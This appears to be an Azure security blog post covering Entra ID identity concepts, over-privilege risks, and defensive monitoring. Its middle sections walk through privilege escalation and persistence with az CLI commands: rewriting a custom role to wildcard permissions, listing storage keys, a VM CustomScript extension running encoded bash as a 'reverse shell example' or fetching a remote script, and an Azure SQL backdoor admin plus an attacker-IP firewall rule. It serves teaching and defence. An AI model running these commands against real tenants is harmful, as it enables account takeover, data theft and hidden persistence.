---
title: Azure Security
date: 2026-01-18 12:44:04
tags:
  - Azure
  - CloudSecurity
  - Cloud
categories: research
keywords: 'Cloud, CloudSecurity Azure'
top_img: /images/cyberpunk-red.png
cover: /images/azure.jpeg
---

Before we do anything else, let's start at the absolute beginning with Identity.

# **EntraID Identity Basics**

## **🪪 Tenant – Your Identity and Trust Boundary in Entra ID**

In Microsoft Entra ID, a tenant is the dedicated, isolated instance of Microsoft’s identity and access management service for your organization. It represents your organization's trust boundary, containing your users, groups, applications, and service principals, along with all associated identity and security configurations.

Each tenant is tied to a single Entra ID directory and is uniquely identified by a tenant ID (GUID) and a primary domain name (e.g., contoso.onmicrosoft.com). Tenants define who can authenticate and access resources and what those identities are allowed to do across Azure, Microsoft 365, and custom applications.

Tenants are completely isolated from one another. Subscriptions, management groups, and resource groups, which are logical abstractions where resources like VMs are going to run in Azure, must be associated with one tenant, and cannot span multiple tenants without explicit cross-tenant configuration (e.g., B2B collaboration, cross-tenant access settings, or guest users).

**Security Best Practice:** Treat the tenant as your core security perimeter. Secure it with MFA, Conditional Access, Privileged Identity Management (PIM), and Identity Protection. Limit global administrators, audit tenant-wide settings regularly, and monitor external access to reduce the risk of identity-based attacks.

## **👤 User – Your Digital Identity in Entra ID**

In Microsoft Entra ID, a user is the directory object that embodies an individual’s presence in the cloud, carrying the attributes that follow that person into Outlook, Teams, SharePoint, Azure resources, and any custom application that trusts the same directory for sign-in. A user record captures personal details such as display name, job title, and contact information, but its true anchor is the immutable Object ID, a GUID that never changes even if the visible account name is altered.

Each user authenticates with one or more sign-in names, the most common being a User Principal Name. Credentials behind that name, whether a password, FIDO2 security key, Windows Hello biometrics, or the Microsoft Authenticator app, prove to Entra ID that the person is who they claim to be. The account itself lives in a single “home” tenant, yet the same individual can appear in other tenants as a guest; in that scenario, the inviting tenant creates a lightweight guest object that references the original home tenant for authentication, allowing cross-organization collaboration without sharing passwords.

Because every access token issued to Microsoft 365 or Azure ultimately traces back to a user object, the directory treats that object as the essential key to resources. Permissions flow from Azure RBAC roles, Microsoft 365 roles, and application-specific roles that target the user’s Object ID. Audit logs, conditional-access evaluations, and identity-protection risk detections all hinge on that same identifier, ensuring a consistent security story even as users move between departments, devices, and locations.

**Security Best Practice:** Protect user accounts with strong, adaptive controls, enforce multifactor or passwordless sign-in for everyone, apply Conditional Access to challenge risky logins, use Privileged Identity Management to make admin roles time-bound and auditable, disable dormant accounts swiftly, and monitor sign-in logs for anomalies to keep each user object a trusted gateway rather than a potential breach point.

## **👥 Group – The Permission Bundle in Entra ID**

Within Microsoft Entra ID, a group is a single object that stands in for many identities, letting you hand out permissions once and have them flow automatically to every member. Groups come in two flavours: a Security group exists purely for access control and is understood by Azure role-based access, file shares, line-of-business apps, and anything else that reads directory security tokens; a Microsoft 365 group adds collaboration extras, a shared mailbox, calendar, Planner board, OneDrive, and SharePoint team site, so the same membership list governs both access and teamwork tools.

In Entra ID, group membership comes in two flavors. Assigned groups are hand-picked — you manually add or remove each member. Dynamic groups are rule-driven — you define attribute-based rules, and the directory automatically adds or removes users whenever their attributes match or stop matching those rules.

**Security Best Practice:** Treat groups as the levers of least privilege, grant access to the group instead of to individuals, keep high-impact groups small and protected by multifactor and Privileged Identity Management, review membership regularly, and prefer dynamic rules where possible so access moves with the person’s role rather than lingering after their job changes.

## **💼 Service Principal – The Non-Human Identity in Entra ID**

In Microsoft Entra ID, a service principal is the application-shaped identity you grant to code and automation rather than to people. It is created automatically when you register or enterprise-consent to an application, and it lives as its own object inside one tenant with an immutable object ID that authorization rules can target. Because a service principal can be added to Azure roles, Azure AD roles, or custom app roles, it acts as the doorway through which the app performs actions such as deploying resources, querying data, or sending mail.

A service principal supports three direct sign-in methods. The simplest is a client secret, essentially a long password stored in the directory and supplied by the application at token time. A stronger option is an asymmetric key pair, where the private key in a certificate proves the app’s identity while the public key is kept in the directory. The modern, secret-less approach is a federated credential that lets Entra ID trust a third-party token issuer—GitHub Actions, Kubernetes, or any OpenID Connect-compatible platform—so the calling workload never stores credentials at all. None of these sign-ins can prompt for multifactor authentication, so protecting the credentials themselves and tightly scoping the permissions of the service principal are critical. Any user granted owner on the application object can create or roll over secrets and certificates, effectively changing the app’s password at will.

**Security best practice:** prefer certificates or federated credentials over plain secrets, rotate them on a schedule you can prove, confine the principal to the minimum roles required, and switch to managed identities where possible so the platform handles tokens on your behalf. Constantly watch sign-in logs for unexpected locations or usage spikes, and review role assignments the same way you audit human administrators, because once a service principal is compromised it can act at machine speed without the friction of MFA.

## **🧑‍💼 Managed Identity – Credential-Free Access for Azure Workloads**

A managed identity is Azure’s built-in way to let code sign in as a service principal without you ever handling a password or certificate. The moment you switch it on, Entra ID silently creates or attaches a service principal inside your tenant and registers it among the Enterprise Applications, but no secret material is exposed. Your workload pulls a token straight from the local metadata endpoint, and Entra ID trusts that call because the platform itself is making it.

There are two flavours. A system-assigned identity is welded to a single resource instance and disappears when that resource is deleted, whereas a user-assigned identity is created once and can be bound to many resources for consistent RBAC assignments. In both cases, the identity has no long-lived credentials to leak or rotate; token issuance is handled on demand, so the usual burden of secret storage, expiry, and renewal simply vanishes. By granting the managed identity only the Azure roles it needs, you give your application just enough authority to do its job and nothing more, all without ever writing a credential into code or configuration.

**Security Best Practice:** Use a managed identity whenever you can. Grant just the roles it needs and regularly audit both the role list and sign-in logs for anything unusual.

## **📑 Role – Scoped Admin Authority in Entra ID**

In Microsoft Entra ID, a *role* is a built-in bundle of directory permissions that you can attach to a user, group, or service principal so they can manage specific features without inheriting blanket control over the tenant. Each role’s exact capabilities are predefined and documented, letting you see at a glance whether it can reset passwords, edit conditional-access policies, or assign licenses. At the very top sits Global Administrator, the all-powerful role whose holders can change any setting, elevate other accounts, or even lock down the whole directory; every other assignment, from User Administrator to Conditional Access Administrator, offers a narrower slice of authority to keep day-to-day tasks in check.

**Security Best Practice:** Keep Global Administrator seats to an absolute minimum, make every admin role time-bound and approval-based with Privileged Identity Management, and review role assignments regularly so only the right people, and no unattended service principals—hold the keys they truly need.

## **🗺️ App Registration – The Blueprint of Your Application in Entra ID**

An app registration is the authoritative record of an application in Microsoft Entra ID. Creating it assigns a unique Application ID (client ID), records the redirect URIs where Entra ID will send tokens after authentication, and notes which OAuth 2.0 or OpenID Connect flows the app accepts. Inside the same record you decide how the app proves who it is: you can generate a client secret, upload a certificate, or configure a federated credential so a trusted issuer such as GitHub Actions can obtain tokens on the app’s behalf without any stored secret. The registration also lists every API and permission scope the app may call, forming the consent surface administrators see.

Whenever the registration is created, or tenant-wide consent is granted, Entra ID automatically spins up a service principal in the tenant. That runtime identity can be placed in Azure RBAC or directory roles, appears in sign-in logs, and is what code actually uses when it requests tokens.

**Security Best Practice:** Guard credentials like privileged secrets, rotate them on a predictable schedule, prefer federated credentials to eliminate stored secrets, restrict API permissions to the bare minimum, and regularly review both permissions and role assignments.

# **Azure Identity Basics**

## **🧱 Management Groups – Your Strategic Governance Boundary**

Azure Management Groups are hierarchical containers used to centrally manage access, policies, and compliance across multiple subscriptions in a scalable way. They enable governance via Azure Policy, RBAC, and Blueprints, which cascade automatically to all child subscriptions and groups.

- They form a tree structure up to 6 levels deep (excluding root and subscriptions).
- A single Entra ID (Azure AD) tenant can have up to 10,000 management groups, with one immutable root group at the top.
- Each group or subscription has only one parent and must be in the same Entra ID tenant.
- Management groups do not grant direct access to resources but define administrative boundaries.
- Misconfigurations at this level can impact all child subscriptions, making proper governance crucial.

**Best Practice:** Build a clear hierarchy (e.g., Corp, Dev, Prod, Security, Compliance) and apply controls at the highest appropriate level to enforce consistency and reduce misconfiguration risks.

## **📚 Subscriptions – Your Primary Security Boundary**

An Azure subscription is the primary organizational unit and security boundary, encapsulating resources, billing, and an RBAC scope. By default, resources are isolated within a subscription. Cross-subscription access requires explicit setup (e.g., VNet peering, Private Link, or role assignments).

- Every customer must have at least one subscription to deploy workloads.
- Organizations often use multiple subscriptions to separate costs, environments, or access controls.
- A subscription has only one parent (a management group) and cannot contain other subscriptions.
- It is linked to one Entra ID tenant, and permissions applied at the subscription or its parent are inherited by all resources.

**Best Practice:** Use separate subscriptions for dev, staging, prod, logging, and security tooling to limit blast radius, strengthen isolation, and clarify billing.

## **🧠 Resource Groups – Your Logical Resource Boundary**

An Azure resource group is a logical container used to organize and manage related resources (e.g., VMs, databases, functions) by project, department, environment, or billing. It enables unified actions like deployment, monitoring, and RBAC.

- Every resource must belong to exactly one resource group, and each group belongs to one subscription.
- Resource groups are flat (non-hierarchical), cannot nest, and do not organize subscriptions or management groups.
- Permissions set on a group are inherited by all contained resources.
- Deleting a resource group deletes all its resources, making tagging and governance critical.

**Best Practice:** Group resources by application, workload, or lifecycle, apply policies and roles at the group level, and avoid mixing unrelated resources to reduce risk and simplify management.

---

[](https://images.coursestack.com/e0cb94d8-532a-4658-bfdd-5400224f2414/c8e4ffc8-8d80-41af-91bb-9eb93b04b561)

## **Over-Privilege: Azure’s Silent Breach Vector**

- **Contributor copy-paste autopilot**: you search “upload to Blob Storage,” lift the first az role assignment snippet you see, `az role assignment create --role Contributor`—paste, deploy, walk away. Three releases later, that tiny function app can also spin up VMs, delete Key Vault secrets, and nuke Cosmos DB containers, yet nobody remembers who typed the command.
- **Portal quick-start seduction**: the Azure Marketplace blade promises a fully working demo in sixty seconds. It succeeds because the publisher’s ARM template quietly grabs Owner on the entire subscription. You swear you’ll tighten the scope after the proof-of-concept. Spoiler: you won’t.
- **Default identity landmine**: an App Service or VM comes alive with its system-assigned managed identity pre-granted Contributor on the subscription. One RCE exploit later, the attacker is free to reconfigure networks, create additional principals, and pivot across regions, all without hunting for credentials.
- **Keys that outlive the sprint**: a client secret baked into an Azure DevOps variable sticks around long after the original engineer leaves. GitHub’s secret scanner eventually flags it, and so will someone trawling public repos. A single leaked GUID and secret value equals full API access under that service principal’s role set.

In Azure, one over-powered role assignment or forgotten secret can cascade into subscription-wide, or tenant-wide, compromise. Treat permission hygiene as routine ops: let Azure Advisor surface idle role assignments, run Access Reviews and Privileged Identity Management to shrink standing access, and schedule a weekly Azure Resource Graph diff to spot drift. Keep your least-privilege map alive, flag any deviation the moment it appears, and slam the brakes before curious code turns into headline-grade breach.

---

[](https://images.coursestack.com/e0cb94d8-532a-4658-bfdd-5400224f2414/6fa823f8-ab99-4259-b7d6-79e4b7c9794e)

# **Three Practical Privilege Escalation Paths - Azure Edition**

## **1. roleDefinitions Self-Promotion**

**Minimal permission:** `Microsoft.Authorization/roleDefinitions/write`

**Goal:** Silently upgrade a custom role you already hold giving it further privileges

**Attack breakdown**

1. **Identify yourself** – `az account show` reveals your objectId, `az role assignment list --assignee <objectId>` shows any custom role already bound to you.
2. **Fetch the role definition** – `az role definition list --name "UploaderRole" > role.json` saves the current JSON.
3. **Add permissions** – edit `role.json` so the `"Actions"` block reads:

```sh
`{`

`"roleName": "<name of the role>",`

`"Name": "<name of the role>",`

`"IsCustom": true,`

`"Description": "Custom role with elevated privileges",`

`"Actions": ["*"],`

`"NotActions": [],`

`"DataActions": ["*"],`

`"NotDataActions": [],`

`"AssignableScopes": ["/subscriptions/<subscription-id>"],`

`"id": "/subscriptions/<subscription-id>/providers/Microsoft.Authorization/roleDefinitions/<role-id>",`

`}`
```
1. **Push it back** – `az role definition update --role-definition role.json` writes the change; every existing assignment of that role (including your own) now grants unrestricted access across the scope.
2. **Refresh token** – run `az account get-access-token` or simply re-authenticate so the expanded rights flow into your credential. One quiet role tweak has turned limited access into full subscription control.

*A single `roleDefinitions/write` call followed by a token refresh turns a low-tier identity into full subscription dominance.*

[*More on HackTricks*](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-privilege-escalation/az-authorization-privesc.html#microsoftauthorizationroledefinitionswrite)

## **2. *storageAccounts Key Grab***

**Minimal permission:** `*Microsoft.Storage/storageAccounts/listkeys/action` (or `Microsoft.Storage/storageAccounts/regenerateKey/action`)*

**Goal:** harvest or mint storage-account access keys and ride them to full control over the data plane

**Attack breakdown**

1. **Identify the target** – `az storage account show --name <acc-name>` confirms the resource exists and shows its region.
2. **List keys (**`*Microsoft.Storage/storageAccounts/listkeys/action*`**)** – `az storage account keys list --account-name <acc-name>` returns both key1 and key2 in plaintext; either key lets you authenticate as the account for Blob, Queue, Table, and File operations.
3. **Regenerate keys (**`*Microsoft.Storage/storageAccounts/regenerateKey/action*`**)** – `az storage account keys renew --account-name <acc-name> --key key2` issues a fresh secret and, in the same response, hands you the brand-new key plus the untouched partner key, guaranteeing uninterrupted access.
4. **Use the keys -** Now we can use the keys to access the storage

`az storage blob list \`

- `-account-name <acc-name> \`
- `-account-key <key1-or-key2> \`
- `-container-name mycontainer`

*A single `listkeys` (or `regenerateKey`) call puts every object in the storage account, and any service that trusts those keys, at your fingertips.*

[*More on HackTricks*](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-privilege-escalation/az-storage-privesc.html#microsoftstoragestorageaccountslistkeysaction)

## **3. vmExtensions Remote Code**

**Minimal permission:** `Microsoft.Compute/virtualMachines/extensions/write`

**Goal**: push an extension that executes arbitrary commands on a target VM.

**Attack breakdown**

1. Identify the VM with `az vm show --name <vm> --resource-group <rg>` to grab its resource ID and confirm OS.
2. Plant your payload by running:

```sh
`# reverse shell example (Linux)`

`az vm extension set \`

- `-resource-group <rg> \`
- `-vm-name <vm> \`
- `-name CustomScript \`
- `-publisher Microsoft.Azure.Extensions \`
- `-version 2.1 \`
- `-settings '{}' \`
- `-protected-settings '{"commandToExecute":"echo <b64> | base64 -d | bash"}'`
```

1. —or point the extension at an external script:
```sh

`az vm extension set \`

- `-resource-group <rg> \`
- `-vm-name <vm> \`
- `-name CustomScript \`
- `-publisher Microsoft.Azure.Extensions \`
- `-version 2.1 \`
- `-settings '{"fileUris":["https://example.com/hack.sh"]}' \`
- `-protected-settings '{"commandToExecute":"sh hack.sh"}'`

```

1. CustomScript and many other extensions run as **root on Linux or SYSTEM on Windows**, so the code executes with full OS privileges and can install backdoors, harvest credentials, get a reverse shell or pivot deeper into the network.

A single `virtualMachines/extensions/write` call is enough to flip a low-tier identity into root/SYSTEM control of the VM, and whatever the VM itself can reach, including its managed identities, without ever touching its console or credentials.

[*More on HackTricks*](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-privilege-escalation/az-virtual-machines-and-network-privesc.html#microsoftcomputevirtualmachinesextensionswrite)

---

# **🌀 Other High-Frequency Azure Weaknesses — 2025 snapshot**

## **1. Leaked secrets, connection strings & SAS tokens**

[GitGuardian’s 2024 “Secrets Sprawl” study](https://www.gitguardian.com/state-of-secrets-sprawl-report-2024) shows thousands of Azure connection strings and account keys turning up on public GitHub every single week, part of the 12.7 million total secrets it flagged last year. The risk is not theoretical: in 2[023 Microsoft AI researchers accidentally posted a Shared-Access-Signature](https://msrc.microsoft.com/blog/2023/09/microsoft-mitigated-exposure-of-internal-information-in-a-storage-account-due-to-overly-permissive-sas-token/) that exposed 38 TB of internal data, source code and Teams messages. Because an SAS or storage-account key bypasses Entra ID altogether, anyone who finds it can read or overwrite data until the expiry (or, for account keys, forever).

**Mitigation:** scan repos and CI logs for Azure tokens, move secrets into Key Vault, prefer managed identities over keys, and set short-lived SAS tokens with automatic rotation.

---

## **2. Public Blob containers & over-permissive network paths**

Misconfigured storage keeps leaking data: a [February 2025 breach](https://www.techradar.com/pro/security/over-26-million-resumes-exposed-in-top-cv-maker-data-breach-heres-what-we-know) left 26 million resumes in an open Azure Blob container belonging to TalentHook. Earlier exposures such as the [BlueBleed incident in 2022](https://www.skyhighsecurity.com/industry-perspectives/bluebleed-leak-proves-it-again-you-cannot-assume-cloud-service-providers-are-secure.html) showed that one anonymous-read container can spill customer names, emails and contracts from thousands of organizations. Open NSG rules add to the blast radius by exposing RDP/SSH or database ports directly to the internet.

**Mitigation:** lock Blob containers to private access, require Azure Storage firewalls or Private Endpoints, deny `0.0.0.0/0` NSG rules by policy, and run automated sweeps with Defender for Cloud or ScoutSuite to catch anything that slips through.

---

## **3. Over-broad RBAC roles & cross-tenant app consent**

A single custom role update or hasty Marketplace deploy can hand out `Contributor` or even `Owner` at subscription scope. [SpecterOps’ 2025 analysis](https://posts.specterops.io/microsoft-breach-what-happened-what-should-azure-admins-do-da2b7e674ebc) of the “Midnight Blizzard” breach highlights how service principals effectively become Global Admins—and how foreign apps can retain those powers for years if no one reviews them.

**Mitigation:** use Azure AD Privileged Identity Management to make high-impact roles eligible and time-bound, lean on Azure Advisor’s “unused role assignment” recommendations, block tenant-wide consent for new apps, and run weekly Resource Graph or Graph API scans for assignments that drift outside least-privilege guidelines.

---

# **Stealthy Persistence: Azure SQL Backdoor**

Azure SQL offers two parallel doors, SQL Authentication and Entra ID Authentication, and both can be wedged open for long-term access.

## **Attack recipe**

Start by turning on SQL Authentication if it was disabled, then create a low-profile login (`CREATE LOGIN`) and map it to a user in every interesting database. Even simpler: harvest an existing SQL password from code, dumps, or GitHub and reuse it.

With control of an Entra ID account that has *Contributor* on the server, call:

`az sql server ad-admin create \`

- `-resource-group <rg> \`
- `-server <srv> \`
- `-display-name "BackdoorAdmin" \`
- `-object-id <compromised-objectId>`

That one API (`Microsoft.Sql/servers/administrators/write`) crowns the attacker as Azure AD administrator, so every future token they obtain, CLI, Visual Studio, even a stolen refresh token, grants sysadmin rights inside the database engine.

If the workload runs on an IaaS VM with SQL Server, drop a startup script or new local admin user on the box to survive credential rotation at the SQL layer. Finally, carve a firewall hole:

`az sql server firewall-rule create \`

- `-resource-group <rg> \`
- `-server <srv> \`
- `-name "KeepDoorOpen" \`
- `-start-ip-address <attacker-IP> \`
- `-end-ip-address <attacker-IP>`

That rule (`Microsoft.Sql/servers/firewallRules/write`) guarantees inbound reachability even after network hardening elsewhere.

## **Why it slips past defenders**

- SQL logins live entirely inside the database engine; Azure RBAC audits can’t see them.
- Setting an Azure AD admin looks like routine maintenance and triggers no sign-in disruption.
- The firewall rule is often mistaken for a temporary diagnostics change and forgotten.

One new SQL user, one `ad-admin create`, and a quiet firewall rule are enough to keep a hidden foothold in Azure SQL long after the initial compromise is “fixed.”

---

# **Defense & Monitoring Strategies**

[safe](https://images.coursestack.com/b29c0d77-61fb-460a-bbf2-dea82bcb0c62/17546e01-4d43-4c02-90f4-54304deec126)

Securing Azure is a continuous loop of hardening, validation, and monitoring across every subscription and management group.

## **1. Harden every subscription in isolation**

- **Least-privilege RBAC**: Trim *Owner/Contributor* grants with Azure Advisor “unused role” findings, use Managed Identities for workloads, and enforce MFA or passwordless for every human account via Conditional Access.
- **Policy guardrails**: Deploy Azure Policy to block public blobs (`Microsoft.Storage/storageAccounts/allowBlobPublicAccess`), deny Internet-facing NSG rules, require customer-managed keys on disks and SQL, and enforce Trusted Launch on VMs.
- **Secure defaults**: Route traffic through Private Endpoints, enable Defender for Cloud’s Just-in-Time VM access, and apply resource locks on mission-critical storage.
- **Avoid default identities**: Disable built-in system identities that start with broad rights and create scoped identities instead.

## **2. Eliminate misconfigurations early**

- **Template gates**: Break Bicep/Terraform deploys in CI if they violate policy or open unmanaged ports.
- **Landing-zone blueprints**: Stamp baseline VNets with deny-all NSGs, flow logs, and organisational tags before any app team onboards.
- **Guest Configuration**: Enforce Defender Antivirus, Sysmon, and CIS benchmarks inside every VM at boot.

## **3. Restrict external trust**

- **No wildcards**: Turn off user consent for multi-tenant apps; route new enterprise apps through App Governance review.
- **Scoped federation**: Use explicit Cross-Tenant Access settings so partners receive only the precise groups and roles they need—Teams access ≠ SharePoint access.
- **Rotate or retire secrets**: Force 90-day expiry on client secrets, move to Managed Identities or workload identity federation, and kill lingering storage-account keys.

## **4. Test the posture constantly**

- **Continuous scanning**: Keep Defender for Cloud secure score above target, patch findings weekly, and track progress with Power BI dashboards.
- **Open-source sweep**: Schedule automatic auditing tools weekend; block pull requests on critical failures.

## **5. Monitor for malicious actions**

- **Centralised, immutable logs**: Stream Activity Logs and diagnostics to a locked Log Analytics workspace with retention policies.
- **Sentinel alerts**: Trigger on high-risk ops like `roleDefinitions/write`, storage key regeneration, Key Vault `SecretGet`, or SQL AD admin changes.
